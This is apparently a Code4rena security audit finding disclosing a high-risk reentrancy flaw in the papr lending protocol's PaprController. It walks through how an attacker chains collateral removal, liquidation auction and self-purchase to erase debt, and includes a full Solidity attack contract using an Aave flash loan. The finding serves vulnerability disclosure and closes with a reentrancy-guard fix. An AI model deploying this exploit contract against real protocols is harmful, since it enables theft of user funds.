## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- edited-by-warden
- H-02

# [Stealing fund by applying reentrancy attack on `removeCollateral`, `startLiquidationAuction`, and `purchaseLiquidationAuctionNFT`](https://github.com/code-423n4/2022-12-backed-findings/issues/102) 

# Lines of code

https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L444


# Vulnerability details

## Impact

By applying reentrancy attack involving the functions `removeCollateral`, `startLiquidationAuction`, and `purchaseLiquidationAuctionNFT`, an Attacker can steal large amount of fund.

## Proof of Concept

 - Bob (a malicious user) deploys a contract to apply the attack. This contract is called `BobContract`. Please note that all the following transactions are going to be done in one transaction.
 - BobContract takes a flash loan of 500K USDC.
 - BobContract buys 10 NFTs with ids 1 to 10 from collection which are allowed to be used as collateral in this project. Suppose, each NFT has price of almost 50k USDC.
 - BobContract adds those NFTs as collateral by calling the function `addCollateral`. So `_vaultInfo[BobContract][collateral.addr].count = 10`.
```
function addCollateral(IPaprController.Collateral[] calldata collateralArr) external override {
        for (uint256 i = 0; i < collateralArr.length;) {
            _addCollateralToVault(msg.sender, collateralArr[i]);
            collateralArr[i].addr.transferFrom(msg.sender, address(this), collateralArr[i].id);
            unchecked {
                ++i;
            }
        }
    }
```
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L98
 - BobContract borrows the max allowed amount of `PaprToken` that is almost equivalent to 250k USDC (for simplicity I am assuming target price and mark price are equal to 1 USDC. This assumption does not change the attack scenario at all. It is only to simplify the explanation). This amount is equal to 50% of the collateral amount. It can be done by calling the function `increaseDebt`.
 ```
function maxDebt(uint256 totalCollateraValue) external view override returns (uint256) {
        if (_lastUpdated == block.timestamp) {
            return _maxDebt(totalCollateraValue, _target);
        }

        return _maxDebt(totalCollateraValue, newTarget());
    }
```
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L393
```
function _maxDebt(uint256 totalCollateraValue, uint256 cachedTarget) internal view returns (uint256) {
        uint256 maxLoanUnderlying = totalCollateraValue * maxLTV;
        return maxLoanUnderlying / cachedTarget;
    }
```
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L556
```
function increaseDebt(
        address mintTo,
        ERC721 asset,
        uint256 amount,
        ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo
    ) external override {
        _increaseDebt({account: msg.sender, asset: asset, mintTo: mintTo, amount: amount, oracleInfo: oracleInfo});
    }
```
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138
 - BobContract now has 10 NFTs as collateral (worth 500k) and borrowed 10*50k*50% = 250k.
 - BobContract intends to call the function `removeCollateral`. (In the normal way of working with the protocol, this is not allowed, because by removing even 1 NFT, the debt 250k becomes larger than max allowed collateral 9*50k*50%).
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L109
 - Here is the trick. BobContract calls this function to remove the NFT with id 1. During the removal in the function `_removeCollateral`, the `safeTransferFrom` callbacks the BobContract.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L444
https://github.com/transmissions11/solmate/blob/3a752b8c83427ed1ea1df23f092ea7a810205b6c/src/tokens/ERC721.sol#L120
 - In the callback, BobContract calls this function again to remove the next NFT (I mean the NFT with id 2).
 - BobContract repeats this for 9 NFTs. So, when all the NFTs with id 1 to 9 are removed from the protocol, in the last callback, BobContract calls the function `startLiquidationAuction` to put the NFT with id 10 on the auction. Please note that after removal of 9 NFTs, they are transferred to BobContract, and `_vaultInfo[BobContract][collateral.addr].count = 1`. So, BobContract health factor is not solvent any more because total debt is the same as before 250k, but max debt is now 1*50k*50% = 25k.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L438
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297
 - After calling the function `startLiquidationAuction`, it checks whether the debt is larger than max debt or not. Since 9 NFTs were removed in the previous steps, `info.count = 1`, so debt is larger than max debt. 
```
if (info.debt < _maxDebt(oraclePrice * info.count, cachedTarget)) {
            revert IPaprController.NotLiquidatable();
        }
```
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317
 - Then, since this last NFT (with id 10) is going to be auctioned, the variable count will be decremented by one, so `_vaultInfo[msg.sender][collateral.addr].count = 0`. Moreover, the starting price for this NFT will be `3*oraclePrice` (because the `auctionStartPriceMultiplier = 3`), so it will be almost 3 * 50k = 150k.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L326
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L341
 - BobContract calls the function `purchaseLiquidationAuctionNFT` to buy it's own NFT with id 10 which is priced at almost 150k.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264
 - In this function, we have the followoing variables:
   - `collateralValueCached ` = 150k * 0 = 0
   - `isLastCollateral ` = TRUE
   - `debtCached ` = 250k (same as before)
   - `maxDebtCached ` = 250k
   - `neededToSaveVault ` = 0
   - `price ` = 150k Please note that the functions `_purchaseNFTAndUpdateVaultIfNeeded` and `_purchaseNFT` are called that takes 150k from BobContract and transfers that last NFT with id 10 to BobContract.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L519
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/NFTEDA/NFTEDA.sol#L72
   - `excess ` = 150k Since it is larger than zero, the function `_handleExcess` is called.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L532
   - `fee ` = 15k Considering 10% fee on the excess
   - `credit` = 135k
   - `totalOwed ` = 135k Since this is smaller than `debtCaches` 250k, the function `_reduceDebt` is called to reduce debt from 250k to 115k.
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L549
   - `remaining` = 115k
 - All the above calculations mean that the last NFT is sold at 150k, and 15k is considered as fee, so 135k will be deducted from the debt. Since the debt was 250k, still 115k is remained as debt.
 - In the last part of the function `purchaseLiquidationAuctionNFT`, there is a check that makes the debt of BobContract equal to zero. This is the place that BobContract takes profit. It means that the debt of 115k is ignored.
```
if (isLastCollateral && remaining != 0) {
            /// there will be debt left with no NFTs, set it to 0
            _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);
        }
```
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L290
 - Now, the control returns back to the contract `PaprController`. So, it compares the debt and max for each collateral removal. Since the debt is set to zero in the previous steps, this check for all 10 NFTs will be passed.
```
if (debt > max) {
            revert IPaprController.ExceedsMaxDebt(debt, max);
        }
```
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L449
 - Now that the attack is finished. BobContract repays the flash loan after selling those 10 NFTs.
 - ***Bob had 250k that borrowed at first, then he paid 150k to buy his own NFT with id 10 on the auction, so Bob's profit is equal to 100k. In summary, he could borrow 250k but only repaid 150k and received all his collateral.***
 - Please note that taking a flash loan is not necessary, it is just to show that it can increase the attack impact much more.
 - Please note that if Bob applies the same attack with only 3 NFTs (each worth 50k) and borrows 75k, he does not take any profit. Because, the last NFT should be bought 3 times the oracle price (3*50k = 150k) while the total debt was 75k.
 - ***In order to take profit and steal fund, the attacker at least should add 7 NFTs as collateral and borrow the max debt. Because `numberOfNFT * oraclePrice * 50% > oraclePrice * 3`***

In the following PoC, I am showing how the attack can be applied.
Bob deploys the following contract and calls the function `attack()`. It takes flash loan from AAVE, then the callback from the AAVE will execute `executeOperation`. In this function, 10 NFTs with ids 1 to 10 are bought and added as collateral to the protocol. 
Then, it borrows max debt which is almost 250k, and remove the NFT with id 1. 
In the callback of `safeTransferFrom`, the function `onERC721Received` is called, if the number of callback is less than 9, it repeats removal of the NFTs with ids 2 to 9, respectively. 
When NFTs with id 9 is removed, the function `startLiquidationAuction` is called to auction NFT with id 10. Then, this NFT is purchased by BobContract immediately at the start price (which is defined by protocol to be 3 times larger than the oracle price). Then, after the control is returned to the protocol, BobContract sells these 10 NFTs and repays the flash loan.

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface ERC721 {}

interface ERC20 {}

struct Collateral {
    ERC721 addr;
    uint256 id;
}
struct OracleInfo {
    Message message;
    Sig sig;
}
struct Message {
    bytes32 id;
    bytes payload;
    uint256 timestamp;
    bytes signature;
}
struct Sig {
    uint8 v;
    bytes32 r;
    bytes32 s;
}
struct Auction {
    address nftOwner;
    uint256 auctionAssetID;
    ERC721 auctionAssetContract;
    uint256 perPeriodDecayPercentWad;
    uint256 secondsInPeriod;
    uint256 startPrice;
    ERC20 paymentAsset;
}

enum PriceKind {
    SPOT,
    TWAP,
    LOWER,
    UPPER
}

interface IPaprController {
    function addCollateral(Collateral[] calldata collateral) external;

    function increaseDebt(
        address mintTo,
        ERC721 asset,
        uint256 amount,
        OracleInfo calldata oracleInfo
    ) external;

    function removeCollateral(
        address sendTo,
        Collateral[] calldata collateralArr,
        OracleInfo calldata oracleInfo
    ) external;

    function startLiquidationAuction(
        address account,
        Collateral calldata collateral,
        OracleInfo calldata oracleInfo
    ) external returns (Auction memory auction);

    function purchaseLiquidationAuctionNFT(
        Auction calldata auction,
        uint256 maxPrice,
        address sendTo,
        OracleInfo calldata oracleInfo
    ) external;

    function maxDebt(uint256 totalCollateraValue)
        external
        view
        returns (uint256);

    function underwritePriceForCollateral(
        ERC721 asset,
        PriceKind priceKind,
        OracleInfo memory oracleInfo
    ) external returns (uint256);
}

interface IFundingRateController {
    function updateTarget() external returns (uint256);
}

interface IAAVE {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract BobContract {
    IPaprController iPaprController;
    IFundingRateController iFundingRateController;
    IAAVE iAAVE;
    ERC721 nftCollectionAddress;
    ERC20 paprToken;
    Collateral[] collaterals;
    OracleInfo oracleInfo;
    uint256 numOfCallback;
    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    constructor(
        address _paprControllerAddress,
        address _fundingRateControllerAddress,
        address _aaveAddress,
        ERC721 _nftCollectionAddress,
        OracleInfo memory _oracleInfo,
        ERC20 _paprToken
    ) {
        iPaprController = IPaprController(_paprControllerAddress);
        iFundingRateController = IFundingRateController(
            _fundingRateControllerAddress
        );
        iAAVE = IAAVE(_aaveAddress);
        nftCollectionAddress = _nftCollectionAddress;
        oracleInfo = _oracleInfo;
        paprToken = _paprToken;
    }

    function attack() public {
        ///// STEP1: taking flash loan
        iAAVE.flashLoanSimple(address(this), USDC, 10 * 50000 * 10**6, "", 0);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        ///// STEP2: buying 10 NFTs

        // Buy 10 NFTs that each worths almost 50k
        // Assume the ids are from 1 to 10

        ///// STEP3: adding the NFTs as collateral
        for (uint256 i = 0; i < 10; ++i) {
            collaterals.push(Collateral({addr: nftCollectionAddress, id: i}));
        }
        iPaprController.addCollateral(collaterals);

        ///// STEP4: borrowing as much as possible
        uint256 oraclePrice = iPaprController.underwritePriceForCollateral(
            nftCollectionAddress,
            PriceKind.LOWER,
            oracleInfo
        );

        uint256 maxDebt = iPaprController.maxDebt(10 * oraclePrice);

        iPaprController.increaseDebt(
            address(this),
            nftCollectionAddress,
            maxDebt,
            oracleInfo
        );

        ///// STEP5: removing the NFT with id 1
        Collateral[] memory collateralArr = new Collateral[](1);
        collateralArr[0] = Collateral({addr: nftCollectionAddress, id: 1});
        iPaprController.removeCollateral(
            address(this),
            collateralArr,
            oracleInfo
        );

        ///// STEP16: selling 10 NFTs and repaying the flash loan

        // Selling the 10 NFTs
        // Repaying the flash loan
    }

    function onERC721Received(
        address from,
        address,
        uint256 _id,
        bytes calldata data
    ) external returns (bytes4) {
        numOfCallback++;
        if (numOfCallback < 9) {
            ///// STEP6 - STEP13: removing the NFTs with id 2 to 9
            Collateral[] memory collateralArr = new Collateral[](1);
            collateralArr[0] = Collateral({
                addr: nftCollectionAddress,
                id: _id + 1
            });
            iPaprController.removeCollateral(
                address(this),
                collateralArr,
                oracleInfo
            );
        } else {
            ///// STEP14: starting the auction for NFT with id 10
            Collateral memory lastCollateral = Collateral({
                addr: nftCollectionAddress,
                id: _id + 1
            });
            iPaprController.startLiquidationAuction(
                address(this),
                lastCollateral,
                oracleInfo
            );

            ///// STEP15: buying the NFT with id 10 on the auction
            uint256 oraclePrice = iPaprController.underwritePriceForCollateral(
                nftCollectionAddress,
                PriceKind.LOWER,
                oracleInfo
            );
            uint256 startPrice = (oraclePrice * 3 * 1e18) /
                iFundingRateController.updateTarget();

            Auction memory auction = Auction({
                nftOwner: address(this),
                auctionAssetID: 10,
                auctionAssetContract: nftCollectionAddress,
                perPeriodDecayPercentWad: 0.7e18,
                secondsInPeriod: 1 days,
                startPrice: startPrice,
                paymentAsset: paprToken
            });

            iPaprController.purchaseLiquidationAuctionNFT(
                auction,
                startPrice,
                address(this),
                oracleInfo
            );
        }
    }
}

```

## Tools Used

## Recommended Mitigation Steps
 - Adding a reentrancy guard to the involved functions can be a solution.